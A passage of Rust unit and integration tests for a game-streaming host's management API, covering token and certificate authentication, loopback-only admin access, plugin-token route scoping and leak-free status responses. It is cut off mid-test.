//! Handler + auth tests for the management API, exercised through `app()`. Split out of the
//! `mgmt` facade (plan §W5).

/// The published endpoint line has to satisfy TWO parsers written independently: systemd
/// (`EnvironmentFile=`) and `windows::service::read_env_file_value`. This pins the shape both need
/// — one `KEY=VALUE` line — and re-implements the Windows reader's split, so a change to the format
/// fails here rather than silently pointing the console at the wrong port on the one platform CI
/// cannot exercise.
#[test]
fn published_endpoint_line_parses_the_way_both_consumers_read_it() {
    let dir = std::env::temp_dir().join(format!(
        "pf-mgmt-endpoint-{}-{:p}",
        std::process::id(),
        &0u8 as *const u8
    ));
    std::fs::create_dir_all(&dir).unwrap();
    let path = super::write_endpoint(&dir, 47991).unwrap();
    assert_eq!(path.file_name().unwrap(), super::ENDPOINT_FILE);

    let contents = std::fs::read_to_string(&path).unwrap();
    assert_eq!(contents, "PUNKTFUNK_MGMT_URL=https://127.0.0.1:47991\n");

    // `read_env_file_value`'s exact logic: first non-blank line, split once on '=', take the value.
    let line = contents
        .lines()
        .find(|l| !l.trim().is_empty())
        .unwrap()
        .trim();
    let value = line.split_once('=').map_or(line, |(_, v)| v).trim();
    assert_eq!(value, "https://127.0.0.1:47991");
    // The value must survive that split intact — i.e. carry no '=' of its own.
    assert!(!value.contains('='));
    // Loopback whatever the listener binds: the console proxies over loopback by design, so a wide
    // 0.0.0.0 bind must never be echoed here as a LAN URL.
    assert!(value.starts_with("https://127.0.0.1:"));

    let _ = std::fs::remove_dir_all(&dir);
}

use super::*;
use crate::encode::Codec;
#[cfg(feature = "gamestream")]
use crate::gamestream::cert::ServerIdentity;
use crate::gamestream::tls::{PeerAddr, PeerCertFingerprint};
use crate::gamestream::{Host, LaunchSession, HTTPS_PORT, HTTP_PORT};
use axum::body::Body;
use axum::http::StatusCode;
use http_body_util::BodyExt;
use sha2::{Digest, Sha256};
use std::net::{IpAddr, Ipv4Addr};
use std::sync::atomic::Ordering;
use tower::ServiceExt;

/// A throwaway client-logs dir (same shape as [`test_stats`] — never the real config dir).
fn test_client_logs_dir() -> std::path::PathBuf {
    std::env::temp_dir().join(format!(
        "pf-mgmt-clientlogs-{}-{:p}",
        std::process::id(),
        &0u8 as *const u8
    ))
}

/// A throwaway stats recorder rooted in a unique temp dir (never touches the real config dir).
fn test_stats() -> Arc<crate::stats_recorder::StatsRecorder> {
    crate::stats_recorder::StatsRecorder::new(std::env::temp_dir().join(format!(
        "pf-mgmt-stats-{}-{:p}",
        std::process::id(),
        &0u8 as *const u8
    )))
}

fn test_state() -> Arc<AppState> {
    let host = Host {
        hostname: "test-host".into(),
        uniqueid: "deadbeef".into(),
        local_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
        http_port: HTTP_PORT,
        https_port: HTTPS_PORT,
        os_chain: "linux/arch/steamos".into(),
        os_name: "SteamOS".into(),
    };
    #[cfg(feature = "gamestream")]
    {
        let identity = ServerIdentity::ephemeral().expect("ephemeral identity");
        Arc::new(AppState::new(host, identity, test_stats()))
    }
    #[cfg(not(feature = "gamestream"))]
    {
        Arc::new(AppState::new(host, test_stats()))
    }
}

// The mgmt API now always requires auth, so the router always has a token. A test that passes
// `None` gets the default "test-secret" (and `send` auto-attaches the matching bearer); a test
// that passes an explicit token exercises a mismatch (e.g. `bearer_token_is_enforced`).
fn test_app(state: Arc<AppState>, token: Option<&str>) -> Router {
    let stats = state.stats.clone();
    app(
        state,
        Some(token.unwrap_or("test-secret").to_string()),
        // The scoped plugin lane, exercised by the `plugin_token_*` tests below.
        Some("plugin-secret".to_string()),
        DEFAULT_PORT,
        None,
        stats,
        test_client_logs_dir(),
        // GameStream-compat planes off (the secure default the native-only tests model).
        false,
    )
}

fn test_app_native(state: Arc<AppState>, np: Arc<crate::native_pairing::NativePairing>) -> Router {
    // Auth required always; the paired-cert tests inject a fingerprint (cert branch wins), the
    // rest authenticate via the `send`-attached default bearer.
    let stats = state.stats.clone();
    app(
        state,
        Some("test-secret".to_string()),
        Some("plugin-secret".to_string()),
        DEFAULT_PORT,
        Some(np),
        stats,
        test_client_logs_dir(),
        false,
    )
}

async fn send(app: &Router, mut req: axum::http::Request<Body>) -> (StatusCode, serde_json::Value) {
    // Auto-attach the default bearer unless the test set its own Authorization (e.g. the
    // mismatch cases in `bearer_token_is_enforced`). Open routes ignore it; authed routes
    // accept it against the `test-secret` default token.
    if !req
        .headers()
        .contains_key(axum::http::header::AUTHORIZATION)
    {
        req.headers_mut().insert(
            axum::http::header::AUTHORIZATION,
            axum::http::HeaderValue::from_static("Bearer test-secret"),
        );
    }
    let resp = app.clone().oneshot(req).await.expect("infallible");
    let status = resp.status();
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    let json = if bytes.is_empty() {
        serde_json::Value::Null
    } else {
        serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null)
    };
    (status, json)
}

fn get_req(path: &str) -> axum::http::Request<Body> {
    axum::http::Request::get(path).body(Body::empty()).unwrap()
}

/// Send a request authenticated ONLY by a paired streaming cert (the `PeerCertFingerprint`
/// `serve_https` would attach) — no bearer header — so `require_auth`'s cert branch decides.
async fn send_cert(app: &Router, mut req: axum::http::Request<Body>, fp: &str) -> StatusCode {
    req.extensions_mut()
        .insert(PeerCertFingerprint(Some(fp.to_string())));
    app.clone().oneshot(req).await.expect("infallible").status()
}

/// A paired *streaming* cert (mTLS, no bearer) authorizes only the read-only allowlist; every
/// state-changing or PIN-exposing route still requires the operator's bearer token (audit #4).
#[tokio::test]
async fn cert_auth_is_a_read_only_allowlist() {
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-cert-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let fp = "deadbeefcafe";
    np.add("streaming-client", fp).unwrap();
    let app = test_app_native(test_state(), np);

    // Allowlisted read-only GETs → the cert authorizes them (not 401).
    for p in [
        "/api/v1/host",
        "/api/v1/status",
        "/api/v1/compositors",
        "/api/v1/library",
    ] {
        assert_ne!(
            send_cert(&app, get_req(p), fp).await,
            StatusCode::UNAUTHORIZED,
            "a paired streaming cert should authorize GET {p}"
        );
    }
    // The paired-client ROSTERS are token-only: one paired cert must NOT be able to enumerate every
    // other paired device's name + fingerprint (security-review 2026-07-17).
    for p in ["/api/v1/clients", "/api/v1/native/clients"] {
        assert_eq!(
            send_cert(&app, get_req(p), fp).await,
            StatusCode::UNAUTHORIZED,
            "the client roster {p} must require the bearer token, not just a paired cert"
        );
    }
    // The scanner settings are admin-only in BOTH directions: the exact-path `/api/v1/library`
    // cert match must not leak the settings GET, and the toggle PUT is operator configuration.
    assert_eq!(
        send_cert(&app, get_req("/api/v1/library/scanners"), fp).await,
        StatusCode::UNAUTHORIZED,
        "the scanner settings must require the bearer token, not just a paired cert"
    );
    // The plugin directory is admin-only — a paired streaming cert has no business enumerating the
    // host's running plugins or reaching a plugin UI's proxy credential (plugin-ui-surface §3).
    for p in [
        "/api/v1/plugins",
        "/api/v1/plugins/rom-manager/ui-credential",
    ] {
        assert_eq!(
            send_cert(&app, get_req(p), fp).await,
            StatusCode::UNAUTHORIZED,
            "the plugin directory {p} must require the bearer token, not just a paired cert"
        );
    }
    // PIN-exposing GET + state-changing routes → token-only (cert rejected without a bearer).
    assert_eq!(
        send_cert(&app, get_req("/api/v1/native/pair"), fp).await,
        StatusCode::UNAUTHORIZED,
        "GET /native/pair exposes the PIN → must require the bearer token"
    );
    assert_eq!(
        send_cert(
            &app,
            post_json(
                "/api/v1/native/pair/arm",
                serde_json::json!({"ttl_secs": 60})
            ),
            fp,
        )
        .await,
        StatusCode::UNAUTHORIZED,
        "arming pairing must require the bearer token"
    );
    assert_eq!(
        send_cert(
            &app,
            axum::http::Request::delete("/api/v1/native/clients/deadbeefcafe")
                .body(Body::empty())
                .unwrap(),
            fp,
        )
        .await,
        StatusCode::UNAUTHORIZED,
        "unpair (DELETE) must require the bearer token"
    );
    // An UNPAIRED cert is rejected even on an allowlisted path.
    assert_eq!(
        send_cert(&app, get_req("/api/v1/status"), "not-paired").await,
        StatusCode::UNAUTHORIZED,
        "an unpaired cert must be rejected"
    );
}

/// The bearer-token (admin) path is honored only from a LOOPBACK peer: the same token from a LAN
/// peer is rejected, so binding the listener to all interfaces (so paired clients can browse the
/// library by default) never LAN-exposes the admin surface. A paired *cert*, by contrast, reaches
/// the read-only allowlist from anywhere.
#[tokio::test]
async fn bearer_admin_is_loopback_only() {
    let lan: SocketAddr = "192.168.1.50:54321".parse().unwrap();
    let loopback: SocketAddr = "127.0.0.1:33333".parse().unwrap();
    let bearer = |peer: SocketAddr| {
        let mut req = get_req("/api/v1/stats/recordings"); // a bearer-only (admin) route
        req.extensions_mut().insert(PeerAddr(peer));
        req.headers_mut().insert(
            axum::http::header::AUTHORIZATION,
            axum::http::HeaderValue::from_static("Bearer test-secret"),
        );
        req
    };

    let app = test_app(test_state(), None);
    // A valid bearer from a LAN peer → rejected on the admin API.
    assert_eq!(
        app.clone()
            .oneshot(bearer(lan))
            .await
            .expect("infallible")
            .status(),
        StatusCode::UNAUTHORIZED,
        "a bearer token from a LAN peer must be rejected on the admin API"
    );
    // The SAME token from a loopback peer (the web console BFF) → accepted.
    assert_ne!(
        app.clone()
            .oneshot(bearer(loopback))
            .await
            .expect("infallible")
            .status(),
        StatusCode::UNAUTHORIZED,
        "the bearer token must be accepted from a loopback peer"
    );

    // A paired cert from a LAN peer still reaches the read-only library (the feature this enables).
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-lanlib-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let fp = "deadbeefcafe";
    np.add("lan-client", fp).unwrap();
    let app = test_app_native(test_state(), np);
    let mut req = get_req("/api/v1/library");
    req.extensions_mut().insert(PeerAddr(lan));
    req.extensions_mut()
        .insert(PeerCertFingerprint(Some(fp.to_string())));
    assert_ne!(
        app.clone().oneshot(req).await.expect("infallible").status(),
        StatusCode::UNAUTHORIZED,
        "a paired cert must reach the library from a LAN peer"
    );

    // The per-image art proxy (`/api/v1/library/art/{id}/{kind}`) is a prefix match in
    // `cert_may_access`, not an exact one (dynamic id/kind segments) — exercise it directly. An
    // unknown `kind` 404s before any disk/network I/O, so this stays a fast, deterministic check
    // of the auth gate (not of art resolution, which `library::tests` covers).
    let mut req = get_req("/api/v1/library/art/steam:570/not-a-real-kind");
    req.extensions_mut().insert(PeerAddr(lan));
    req.extensions_mut()
        .insert(PeerCertFingerprint(Some(fp.to_string())));
    assert_eq!(
        app.clone().oneshot(req).await.expect("infallible").status(),
        StatusCode::NOT_FOUND,
        "a paired cert must reach the per-image library art proxy from a LAN peer \
         (and an unknown kind 404s, rather than ever being rejected as unauthorized)"
    );
}

#[tokio::test]
async fn health_is_open_and_versioned() {
    let app = test_app(test_state(), None);
    let (status, body) = send(&app, get_req("/api/v1/health")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["status"], "ok");
    assert_eq!(body["abi_version"], punktfunk_core::ABI_VERSION);
}

/// Serializes the tests that read (or write) the process-global live-session registry
/// ([`crate::session_status`]): a session registered by one test would otherwise make a
/// concurrently running one see a stream it never started.
static SESSION_REGISTRY_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());

/// A `/local/summary` request from a loopback peer (the tray's own).
fn summary_req() -> axum::http::Request<Body> {
    let mut req = get_req("/api/v1/local/summary");
    req.extensions_mut()
        .insert(PeerAddr("127.0.0.1:40000".parse().unwrap()));
    req
}

/// Registers a stand-in live native session; the returned guard removes it on drop.
fn fake_native_session(
    width: u32,
    height: u32,
    fps: u32,
) -> crate::session_status::LiveSessionGuard {
    let packed = ((width as u64) << 32) | ((height as u64) << 16) | fps as u64;
    crate::session_status::register(crate::session_status::Registration {
        mode: Arc::new(std::sync::atomic::AtomicU64::new(packed)),
        bitrate_kbps: Arc::new(std::sync::atomic::AtomicU32::new(20_000)),
        codec: Codec::H265,
        stop: Arc::new(std::sync::atomic::AtomicBool::new(false)),
        quit: Arc::new(std::sync::atomic::AtomicBool::new(false)),
        force_idr: Arc::new(std::sync::atomic::AtomicBool::new(false)),
        client: "test-client".into(),
        client_name: Some("studio-deck".into()),
        hdr: false,
        ttff_ms: Arc::new(std::sync::atomic::AtomicU32::new(0)),
        last_resize_ms: Arc::new(std::sync::atomic::AtomicU32::new(0)),
        // No launch: a desktop stream, which must show no game row.
        game: None,
    })
}

/// A native (punktfunk/1) session — the DEFAULT plane — must read as streaming in the tray's
/// summary. The GameStream `streaming` flag stays false throughout such a session, and reading it
/// alone left the tray showing "idle" (with the idle icon) for the whole stream: exactly the blind
/// spot `/status` was fixed for in [`crate::session_status`], which `/local/summary` still had.
#[tokio::test]
async fn local_summary_reports_a_native_session_as_streaming() {
    let _serial = SESSION_REGISTRY_LOCK.lock().await;
    let app = test_app(test_state(), None);

    let (status, body) = send(&app, summary_req()).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["video_streaming"], false);
    assert_eq!(body["session"], serde_json::Value::Null);

    let session = fake_native_session(3840, 2160, 120);
    let (_, body) = send(&app, summary_req()).await;
    assert_eq!(body["video_streaming"], true, "native session: {body}");
    assert_eq!(body["audio_streaming"], true, "native session: {body}");
    assert_eq!(body["session"]["width"], 3840);
    assert_eq!(body["session"]["height"], 2160);
    assert_eq!(body["session"]["fps"], 120);
    // The STREAMING client's display name rides along (the tray's connect toast); see the
    // non-sensitive test below for the idle-side guarantee.
    assert_eq!(body["client_name"], "studio-deck");

    // Session over → back to idle, and the name goes with it.
    drop(session);
    let (_, body) = send(&app, summary_req()).await;
    assert_eq!(body["video_streaming"], false);
    assert_eq!(body["session"], serde_json::Value::Null);
    assert_eq!(
        body["client_name"],
        serde_json::Value::Null,
        "no live session → no client name in the summary"
    );
}

/// The tray's `/local/summary` is unauthenticated for LOOPBACK peers only — a LAN peer is
/// rejected even though the route needs no bearer token, and the body never carries secret
/// material (no PIN values, no fingerprints). The ONE name it may carry is the *streaming*
/// client's display name (`client_name`, for the tray's connect toast) — a paired-but-idle
/// device's name must still never appear, which is what this test pins (it pairs a device and
/// registers NO session).
#[tokio::test]
async fn local_summary_is_loopback_only_and_non_sensitive() {
    let _serial = SESSION_REGISTRY_LOCK.lock().await;
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-summary-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    np.add("secret-device-name", "deadbeefcafe0123").unwrap();
    let app = test_app_native(test_state(), np);

    // Loopback peer, NO auth header → 200 with the expected shape.
    let mut req = get_req("/api/v1/local/summary");
    req.extensions_mut()
        .insert(PeerAddr("127.0.0.1:40000".parse().unwrap()));
    let (status, body) = send(&app, req).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["video_streaming"], false);
    assert_eq!(body["native_paired_clients"], 1);
    assert_eq!(body["pending_approvals"], 0);
    assert!(body["version"].is_string());
    // No secret material anywhere in the body (paired name / fingerprint must not leak).
    let raw = body.to_string();
    assert!(
        !raw.contains("deadbeefcafe0123") && !raw.contains("secret-device-name"),
        "summary must not leak fingerprints or device names: {raw}"
    );

    // The same request from a LAN peer → rejected (route is loopback-gated, not just tokenless).
    let mut req = get_req("/api/v1/local/summary");
    req.extensions_mut()
        .insert(PeerAddr("192.168.1.50:40000".parse().unwrap()));
    let (status, _) = send(&app, req).await;
    assert_eq!(
        status,
        StatusCode::UNAUTHORIZED,
        "the local summary must be rejected for a LAN peer"
    );

    // IPv6 loopback counts as loopback.
    let mut req = get_req("/api/v1/local/summary");
    req.extensions_mut()
        .insert(PeerAddr("[::1]:40000".parse().unwrap()));
    let (status, _) = send(&app, req).await;
    assert_eq!(status, StatusCode::OK, "::1 is a loopback peer");
}

#[tokio::test]
async fn bearer_token_is_enforced() {
    let app = test_app(test_state(), Some("sekrit"));

    // No/wrong token → 401 with the error envelope.
    let (status, body) = send(&app, get_req("/api/v1/status")).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    assert!(body["error"].as_str().unwrap().contains("bearer"));
    let wrong = axum::http::Request::get("/api/v1/status")
        .header("authorization", "Bearer nope")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, wrong).await.0, StatusCode::UNAUTHORIZED);

    // Right token → 200.
    let right = axum::http::Request::get("/api/v1/status")
        .header("authorization", "Bearer sekrit")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, right).await.0, StatusCode::OK);

    // Health + the spec/docs stay open.
    assert_eq!(
        send(&app, get_req("/api/v1/health")).await.0,
        StatusCode::OK
    );
    assert_eq!(
        send(&app, get_req("/api/v1/openapi.json")).await.0,
        StatusCode::OK
    );
    let docs = app.clone().oneshot(get_req("/api/docs")).await.unwrap();
    assert_eq!(docs.status(), StatusCode::OK);
    let html = docs.into_body().collect().await.unwrap().to_bytes();
    assert!(
        html.starts_with(b"<!doctype html>"),
        "Scalar UI should serve HTML"
    );
}

/// The pure route gate for the plugin lane: exclusion-based, so spot-check both sides — the
/// surface a plugin legitimately uses, and every escalation carve-out.
#[test]
fn plugin_allowlist_excludes_escalation_routes() {
    use axum::http::Method;

    // The legitimate plugin surface stays open (including mutations — sessions, library, leases).
    assert!(auth::plugin_may_access(&Method::GET, "/api/v1/status"));
    assert!(auth::plugin_may_access(&Method::GET, "/api/v1/library"));
    assert!(auth::plugin_may_access(&Method::GET, "/api/v1/clients"));
    assert!(auth::plugin_may_access(&Method::GET, "/api/v1/plugins"));
    assert!(auth::plugin_may_access(
        &Method::PUT,
        "/api/v1/plugins/rom-manager"
    ));
    assert!(auth::plugin_may_access(
        &Method::DELETE,
        "/api/v1/plugins/rom-manager"
    ));

    // Hooks: registration is command execution; even the read can expose webhook credentials.
    assert!(!auth::plugin_may_access(&Method::GET, "/api/v1/hooks"));
    assert!(!auth::plugin_may_access(&Method::PUT, "/api/v1/hooks"));

    // Pairing administration + PIN visibility.
    assert!(!auth::plugin_may_access(&Method::GET, "/api/v1/pair"));
    assert!(!auth::plugin_may_access(&Method::POST, "/api/v1/pair/pin"));
    assert!(!auth::plugin_may_access(
        &Method::GET,
        "/api/v1/native/pair"
    ));
    assert!(!auth::plugin_may_access(
        &Method::POST,
        "/api/v1/native/pair/arm"
    ));
    assert!(!auth::plugin_may_access(
        &Method::GET,
        "/api/v1/native/pending"
    ));
    assert!(!auth::plugin_may_access(
        &Method::POST,
        "/api/v1/native/pending/1/approve"
    ));
    assert!(!auth::plugin_may_access(
        &Method::DELETE,
        "/api/v1/clients/aabbcc"
    ));
    assert!(!auth::plugin_may_access(
        &Method::DELETE,
        "/api/v1/native/clients/aabbcc"
    ));

    // Another plugin's UI proxy secret.
    assert!(!auth::plugin_may_access(
        &Method::GET,
        "/api/v1/plugins/x/ui-credential"
    ));

    // The plugin STORE, wholesale. Installing a plugin runs new code with operator privileges, so a
    // plugin able to do it could install a helper that isn't constrained the way it is — and
    // `POST /store/runtime` would let it switch its own supervisor. Denied by whole-prefix so a
    // route added here later is denied by default rather than by remembering to list it.
    for path in [
        "/api/v1/store/catalog",
        "/api/v1/store/installed",
        "/api/v1/store/sources",
        "/api/v1/store/jobs",
        "/api/v1/store/jobs/job-1",
        "/api/v1/store/runtime",
        "/api/v1/store/some-route-that-does-not-exist-yet",
    ] {
        assert!(
            !auth::plugin_may_access(&Method::GET, path),
            "plugin token must not reach {path}"
        );
    }
    for path in [
        "/api/v1/store/install",
        "/api/v1/store/uninstall",
        "/api/v1/store/refresh",
        "/api/v1/store/runtime",
    ] {
        assert!(
            !auth::plugin_may_access(&Method::POST, path),
            "plugin token must not reach {path}"
        );
    }

    // The update surface, wholesale: today a check, tomorrow `apply` (an installer / the root
    // helper) — operator business end to end, denied by whole-prefix so the apply route added in
    // U1/U2 is denied by default rather than by remembering to list it. And it is deliberately
    // NOT on the paired-cert allowlist either: a streaming client has no business knowing or
    // steering the host's update state.
    for path in [
        "/api/v1/update",
        "/api/v1/update/status",
        "/api/v1/update/check",
        "/api/v1/update/apply-does-not-exist-yet",
    ] {
        assert!(
            !auth::plugin_may_access(&Method::GET, path),
            "plugin token must not reach {path}"
        );
        assert!(
            !auth::plugin_may_access(&Method::POST, path),
            "plugin token must not reach {path}"
        );
        assert!(
            !auth::cert_may_access(&Method::GET, path),
            "a paired streaming cert must not reach {path}"
        );
    }
    assert!(!auth::plugin_may_access(
        &Method::PUT,
        "/api/v1/store/sources/evil"
    ));
    assert!(!auth::plugin_may_access(
        &Method::DELETE,
        "/api/v1/store/sources/unom"
    ));
    // …but a route that merely starts with the same letters is unaffected.
    assert!(auth::plugin_may_access(&Method::GET, "/api/v1/status"));
}

/// The plugin bearer lane end-to-end: scoped 403s on the carve-outs, 200s on the plugin surface,
/// and the same loopback confinement as the admin token.
#[tokio::test]
async fn plugin_token_lane_is_scoped_and_loopback_only() {
    use axum::http::Method;
    let app = test_app(test_state(), None); // admin "test-secret", plugin "plugin-secret"

    let plugin_req = |method: Method, path: &str| {
        axum::http::Request::builder()
            .method(method)
            .uri(path)
            .header("authorization", "Bearer plugin-secret")
            .body(Body::empty())
            .unwrap()
    };

    // The plugin surface authenticates: status + the plugin directory (list and lease removal).
    assert_eq!(
        send(&app, plugin_req(Method::GET, "/api/v1/status"))
            .await
            .0,
        StatusCode::OK
    );
    assert_eq!(
        send(&app, plugin_req(Method::GET, "/api/v1/plugins"))
            .await
            .0,
        StatusCode::OK
    );
    assert_eq!(
        send(
            &app,
            plugin_req(Method::DELETE, "/api/v1/plugins/no-such-plugin")
        )
        .await
        .0,
        StatusCode::NO_CONTENT
    );

    // Log ingest. This is the ONLY token the scripting runner holds (on Windows its LocalService
    // principal cannot even read the admin one), so if this lane ever stopped reaching this route
    // the console's plugin logs would go quiet with nothing else failing — pin it here rather than
    // rely on `plugin_may_access`'s denylist continuing to not match `/plugins/logs`.
    let body = serde_json::json!({"entries": [{
        "ts_ms": 1_700_000_000_000u64,
        "level": "INFO",
        "source": "virtualhere",
        "msg": "hello from the runner",
    }]});
    let req = axum::http::Request::post("/api/v1/plugins/logs")
        .header("content-type", "application/json")
        .header("authorization", "Bearer plugin-secret")
        .body(Body::from(body.to_string()))
        .unwrap();
    assert_eq!(send(&app, req).await.0, StatusCode::NO_CONTENT);

    // The carve-outs answer 403 (authenticated but not authorized), not 401.
    #[cfg_attr(not(feature = "gamestream"), allow(unused_mut))]
    let mut carveouts = vec![
        (Method::GET, "/api/v1/hooks"),
        (Method::PUT, "/api/v1/hooks"),
        (Method::POST, "/api/v1/native/pair/arm"),
        (Method::GET, "/api/v1/native/pending"),
        (Method::DELETE, "/api/v1/clients/aabbcc"),
        (Method::GET, "/api/v1/plugins/x/ui-credential"),
        // The plugin store: a plugin must not be able to install plugins or switch its own runner.
        (Method::GET, "/api/v1/store/catalog"),
        (Method::POST, "/api/v1/store/install"),
        (Method::POST, "/api/v1/store/uninstall"),
        (Method::POST, "/api/v1/store/runtime"),
        (Method::PUT, "/api/v1/store/sources/evil"),
    ];
    // The PIN route only exists in GameStream-featured builds (WP19).
    #[cfg(feature = "gamestream")]
    carveouts.push((Method::GET, "/api/v1/pair"));
    for (method, path) in carveouts {
        let (status, body) = send(&app, plugin_req(method.clone(), path)).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{method} {path}");
        assert!(body["error"].as_str().unwrap().contains("plugin token"));
    }

    // A wrong token never reaches the lane.
    let wrong = axum::http::Request::get("/api/v1/status")
        .header("authorization", "Bearer plugin-wrong")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, wrong).await.0, StatusCode::UNAUTHORIZED);

    // Loopback-only, exactly like the admin token: a LAN peer is refused before token compare.
    let mut lan = plugin_req(Method::GET, "/api/v1/status");
    lan.extensions_mut()
        .insert(PeerAddr("192.168.1.50:40000".parse().unwrap()));
    assert_eq!(send(&app, lan).await.0, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn host_info_reports_identity_and_ports() {
    let app = test_app(test_state(), None);
    let (status, body) = send(&app, get_req("/api/v1/host")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["hostname"], "test-host");
    assert_eq!(body["uniqueid"], "deadbeef");
    // OS identity rides along verbatim from the detected Host (chain for the icon walk,
    // pretty name for the human label).
    assert_eq!(body["os"], "linux/arch/steamos");
    assert_eq!(body["os_name"], "SteamOS");
    assert_eq!(body["ports"]["http"], HTTP_PORT);
    assert_eq!(body["ports"]["mgmt"], DEFAULT_PORT);
    // Codecs are GPU-aware (derived from `Codec::host_wire_caps`), so assert against that mask
    // rather than a fixed set — and confirm HEVC serializes as "hevc" (the unified codec label),
    // never "h265".
    use punktfunk_core::quic::{CODEC_AV1, CODEC_H264, CODEC_HEVC, CODEC_PYROWAVE};
    let caps = Codec::host_wire_caps();
    let expected: Vec<&str> = [
        (CODEC_H264, "h264"),
        (CODEC_HEVC, "hevc"),
        (CODEC_AV1, "av1"),
        (CODEC_PYROWAVE, "pyrowave"),
    ]
    .into_iter()
    .filter(|(bit, _)| caps & bit != 0)
    .map(|(_, name)| name)
    .collect();
    assert_eq!(body["codecs"], serde_json::json!(expected));
    assert!(caps & CODEC_H264 != 0, "H.264 is always encodable");
    // test_app models the secure default (GameStream-compat off).
    assert_eq!(body["gamestream"], false);
}

#[tokio::test]
async fn compositors_lists_all_backends_with_flags() {
    let app = test_app(test_state(), None);
    let (status, body) = send(&app, get_req("/api/v1/compositors")).await;
    assert_eq!(status, StatusCode::OK);
    let arr = body.as_array().expect("array");
    // Compositor backends are Linux-only; elsewhere the list is empty on purpose (the console
    // renders "not applicable on this host" instead of five greyed-out rows).
    #[cfg(not(target_os = "linux"))]
    assert!(arr.is_empty(), "non-Linux hosts advertise no compositors");
    // Every backend the host knows, in stable order.
    #[cfg(target_os = "linux")]
    {
        let ids: Vec<&str> = arr.iter().map(|c| c["id"].as_str().unwrap()).collect();
        assert_eq!(ids, ["kwin", "gamescope", "mutter", "wlroots", "hyprland"]);
    }
    for c in arr {
        assert!(c["available"].is_boolean());
        assert!(c["default"].is_boolean());
        assert!(c["label"].as_str().is_some_and(|s| !s.is_empty()));
    }
    // At most one backend is the auto-detect default (none, if the test env has no desktop).
    assert!(arr.iter().filter(|c| c["default"] == true).count() <= 1);
}

#[tokio::test]
async fn status_reflects_runtime_state() {
    let _serial = SESSION_REGISTRY_LOCK.lock().await;
    let state = test_state();
    let app = test_app(state.clone(), None);

    let (_, body) = send(&app, get_req("/api/v1/status")).await;
    assert_eq!(body["video_streaming"], false);
    assert_eq!(body["session"], serde_json::Value::Null);

    *state.launch.lock().unwrap() = Some(LaunchSession {
        gcm_key: [0; 16],
        rikeyid: 1,
        width: 2560,
        height: 1440,
        fps: 120,
        appid: 1,
        peer_ip: None,
        owner_fp: None,
    });
    state.streaming.store(true, Ordering::SeqCst);

    let (_, body) = send(&app, get_req("/api/v1/status")).await;
    assert_eq!(body["video_streaming"], true);
    assert_eq!(body["session"]["width"], 2560);
    assert_eq!(body["session"]["fps"], 120);
    // Key material must never appear anywhere in the response.
    assert!(!body.to_string().contains("gcm"));
}

// Holding `CONFIG_DIR_TEST_LOCK` across the awaits is the POINT: the env override must cover
// the whole test body, and `#[tokio::test]` is a single-threaded runtime — nothing else can
// need the executor while we hold it.
#[allow(clippy::await_holding_lock)]
#[tokio::test]
async fn paired_clients_list_and_unpair() {
    // Unpair PERSISTS (save_paired → paired.json in the config dir), so point the config dir
    // at a throwaway tempdir — this test must never rewrite the dev box's real pairing store.
    // The guard restores the previous value even if an assertion below panics.
    struct EnvGuard(Option<std::ffi::OsString>);
    impl Drop for EnvGuard {
        fn drop(&mut self) {
            match self.0.take() {
                // SAFETY: dropped while this test still holds CONFIG_DIR_TEST_LOCK, which
                // serializes every test that writes or reads this variable in the binary.
                Some(v) => unsafe { std::env::set_var("PUNKTFUNK_CONFIG_DIR", v) },
                // SAFETY: as above.
                None => unsafe { std::env::remove_var("PUNKTFUNK_CONFIG_DIR") },
            }
        }
    }
    let _serial = crate::identity::CONFIG_DIR_TEST_LOCK
        .lock()
        .unwrap_or_else(|e| e.into_inner());
    let tmp = tempfile::tempdir().unwrap();
    let _env = EnvGuard(std::env::var_os("PUNKTFUNK_CONFIG_DIR"));
    // SAFETY: `_serial` holds CONFIG_DIR_TEST_LOCK (taken above), serializing every test that
    // writes or reads this variable in the binary.
    unsafe { std::env::set_var("PUNKTFUNK_CONFIG_DIR", tmp.path()) };

    let state = test_state();
    let app = test_app(state.clone(), None);

    // Pin a throwaway cert DER as a stand-in client (the native ephemeral identity — CN
    // "punktfunk" — so this works in both build flavors; WP19).
    let stand_in = crate::identity::ephemeral().unwrap();
    let (_, pem) = x509_parser::pem::parse_x509_pem(stand_in.cert_pem.as_bytes()).unwrap();
    let der = pem.contents.clone();
    let fingerprint = hex::encode(Sha256::digest(&der));
    // Isolate from any real paired store on the dev box: AppState::new loads
    // ~/.config/punktfunk/paired.json, so clear it before seeding our stand-in — otherwise
    // a real GameStream-paired client lands at body[0] and this assertion sees its hash.
    {
        let mut p = state.paired.lock().unwrap();
        p.clear();
        // Cloned, not moved: the unpair-all section at the end of this test re-seeds it.
        p.push(der.clone());
    }

    let (status, body) = send(&app, get_req("/api/v1/clients")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body[0]["fingerprint"], fingerprint);
    assert_eq!(body[0]["subject"], "CN=punktfunk");

    // Malformed fingerprint → 400.
    let bad = axum::http::Request::delete("/api/v1/clients/zz")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, bad).await.0, StatusCode::BAD_REQUEST);

    // A LIVE session owned by this client: unpair is a revocation, so it must END the session,
